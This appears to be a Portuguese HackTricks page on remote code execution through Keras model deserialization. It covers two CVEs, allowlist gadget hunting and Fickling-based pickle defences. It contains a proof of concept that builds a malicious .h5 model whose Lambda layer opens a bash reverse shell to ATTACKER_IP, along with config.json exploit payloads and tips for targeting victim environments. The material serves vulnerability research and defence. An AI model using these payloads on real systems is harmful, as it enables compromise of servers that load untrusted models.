# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica os componentes internos e a superfície de ataque do formato nativo .keras e fornece um toolkit para pesquisadores encontrarem Model File Vulnerabilities (MFVs) e gadgets pós-correção.

## Componentes internos do formato de modelo .keras

Um arquivo .keras é um arquivo ZIP que contém, no mínimo:<sup>[[1]](#references)</sup>
- metadata.json – informações genéricas (por exemplo, versão do Keras)
- config.json – arquitetura do modelo (principal superfície de ataque)
- model.weights.h5 – pesos em HDF5

O config.json conduz a desserialização recursiva: o Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.<sup>[[1]](#references)</sup>

Exemplo de trecho para um objeto de camada Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
A desserialização executa:<sup>[[1]](#references)</sup>
- Importação de módulos e resolução de símbolos a partir das chaves module/class_name
- Invocação de from_config(...) ou do construtor com kwargs controlados pelo atacante
- Recursão em objetos aninhados (activations, initializers, constraints, etc.)

Historicamente, isso expunha três primitives a um atacante que criasse o config.json:<sup>[[1]](#references)</sup>
- Controle sobre quais módulos são importados
- Controle sobre quais classes/funções são resolvidas
- Controle sobre os kwargs passados aos construtores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raiz:
- Lambda.from_config() usava python_utils.func_load(...), que decodifica em base64 e chama marshal.loads() sobre bytes controlados pelo atacante; o unmarshalling do Python pode executar código.<sup>[[1]](#references)[[3]](#references)</sup>

Ideia do exploit (payload simplificado no config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigação:
- O Keras impõe safe_mode=True por padrão. Funções Python serializadas em Lambda são bloqueadas, a menos que o usuário opte explicitamente por desativar essa proteção com safe_mode=False.<sup>[[1]](#references)</sup>

Notas:
- Formatos legados (salvamentos HDF5 mais antigos) ou codebases antigas podem não impor verificações modernas, portanto ataques no estilo “downgrade” ainda podem ser aplicáveis quando as vítimas usam loaders antigos.

## CVE-2025-1550 – Importação arbitrária de módulos no Keras ≤ 3.8

Causa raiz:
- _retrieve_class_or_fn usava importlib.import_module() sem restrições, com strings de módulos controladas pelo atacante provenientes de config.json.
- Impacto: Importação arbitrária de qualquer módulo instalado (ou de um módulo plantado pelo atacante em sys.path). O código executado durante a importação é executado, e a construção do objeto ocorre em seguida com kwargs controlados pelo atacante.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ideia do exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Melhorias de segurança (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist de módulos: imports restritos aos módulos oficiais do ecossistema: keras, keras_hub, keras_cv, keras_nlp
- safe mode por padrão: safe_mode=True bloqueia o carregamento inseguro de funções serializadas do Lambda
- Verificação básica de tipos: objetos desserializados devem corresponder aos tipos esperados

## Exploração prática: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Muitas stacks de produção ainda aceitam arquivos de modelo legados do TensorFlow-Keras HDF5 (.h5). Se um atacante puder fazer upload de um modelo que o servidor carregue posteriormente ou use para executar inferência, uma camada Lambda poderá executar Python arbitrário durante load/build/predict.<sup>[[7]](#references)</sup>

PoC mínimo para criar um .h5 malicioso que executa um reverse shell quando desserializado ou utilizado:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas e dicas de confiabilidade:
- Pontos de acionamento: o código pode ser executado várias vezes (por exemplo, durante a construção da camada/primeira chamada, `model.load_model` e `predict`/`fit`). Torne os payloads idempotentes.<sup>[[7]](#references)</sup>
- Fixação de versão: corresponda às versões de TF/Keras/Python da vítima para evitar incompatibilidades de serialização. Por exemplo, crie artefatos usando Python 3.8 com TensorFlow 2.13.1 se isso for o que o alvo utiliza.<sup>[[7]](#references)</sup>
- Replicação rápida do ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validação: um payload benigno como os.system("ping -c 1 YOUR_IP") ajuda a confirmar a execução (por exemplo, observando ICMP com tcpdump) antes de mudar para um reverse shell.<sup>[[7]](#references)</sup>

## Superfície de gadgets após a correção dentro da allowlist

Mesmo com allowlisting e safe mode, ainda resta uma superfície ampla entre os callables permitidos do Keras. Por exemplo, keras.utils.get_file pode baixar URLs arbitrárias para locais selecionáveis pelo usuário.<sup>[[1]](#references)</sup>

Gadget via Lambda que referencia uma função permitida (não bytecode Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitação importante:
- Lambda.call() acrescenta o tensor de entrada como o primeiro argumento posicional ao invocar o callable de destino. Os gadgets escolhidos devem tolerar um argumento posicional extra (ou aceitar *args/**kwargs). Isso restringe quais funções são viáveis.<sup>[[1]](#references)</sup>

## Allowlisting de imports de pickle para modelos de AI/ML (Fickling)

Muitos formatos de modelos de AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefatos antigos do TensorFlow etc.) incorporam dados Python pickle. Attackers abusam rotineiramente dos imports GLOBAL e dos construtores de objetos do pickle para obter RCE ou realizar model swapping durante o carregamento. Scanners baseados em blacklist frequentemente não detectam imports perigosos novos ou não listados.<sup>[[8]](#references)[[14]](#references)</sup>

Uma defesa prática fail-closed consiste em interceptar o deserializador pickle do Python e permitir apenas um conjunto revisado de imports inofensivos relacionados a ML durante o unpickling. O Fickling, da Trail of Bits, implementa essa política e inclui um allowlist de imports de ML selecionado a partir de milhares de pickles públicos do Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modelo de segurança para imports “seguros” (intuições consolidadas por pesquisas e pela prática): os símbolos importados usados por um pickle devem simultaneamente:<sup>[[8]](#references)</sup>
- Não executar código nem causar execução (sem objetos de código compilados/de código-fonte, execução de comandos shell, hooks etc.)
- Não obter/definir atributos ou itens arbitrários
- Não importar nem obter referências a outros objetos Python a partir da pickle VM
- Não acionar nenhum deserializador secundário (por exemplo, marshal ou pickle aninhado), nem indiretamente

Habilite as proteções do Fickling o mais cedo possível na inicialização do processo, para que quaisquer loads de pickle realizados por frameworks (torch.load, joblib.load etc.) sejam verificados:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Dicas operacionais:
- Você pode desativar/reativar temporariamente os hooks quando necessário:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se um modelo comprovadamente seguro for bloqueado, amplie a allowlist do seu ambiente após revisar os símbolos:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- O Fickling também expõe runtime guards genéricos caso você prefira um controle mais granular:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() para aplicar verificações a todos os pickle.load()
- with fickling.check_safety(): para aplicação com escopo definido
- fickling.load(path) / fickling.is_likely_safe(path) para verificações pontuais

- Prefira formatos de modelo que não sejam pickle quando possível (por exemplo, SafeTensors).<sup>[[15]](#references)</sup> Se precisar aceitar pickle, execute os loaders com least privilege, sem network egress, e aplique a allowlist.

Essa estratégia baseada primeiro na allowlist bloqueia comprovadamente caminhos comuns de exploração de ML pickle, mantendo alta compatibilidade. No benchmark da ToB, o Fickling sinalizou 100% dos arquivos maliciosos sintéticos e permitiu aproximadamente 99% dos arquivos limpos dos principais repositórios do Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit do pesquisador

1) Descoberta sistemática de gadgets em módulos permitidos

Enumere callables candidatos em keras, keras_nlp, keras_cv, keras_hub e priorize aqueles com efeitos colaterais em arquivos, network, processos e ambiente.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerar callables potencialmente perigosos nos módulos Keras incluídos na allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Teste direto de desserialização (nenhum arquivo .keras necessário)

Forneça dicionários elaborados diretamente aos desserializadores do Keras para descobrir os parâmetros aceitos e observar os efeitos colaterais.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondagem entre versões e formatos

Keras existe em várias codebases/eras, com diferentes proteções e formatos:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, com exclusão planejada)
- tf-keras: mantido separadamente
- Multi-backend Keras 3 (official): introduziu o formato nativo .keras

Repita os testes em diferentes codebases e formatos (.keras vs legacy HDF5) para descobrir regressões ou proteções ausentes.

## Referências

- [1] [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
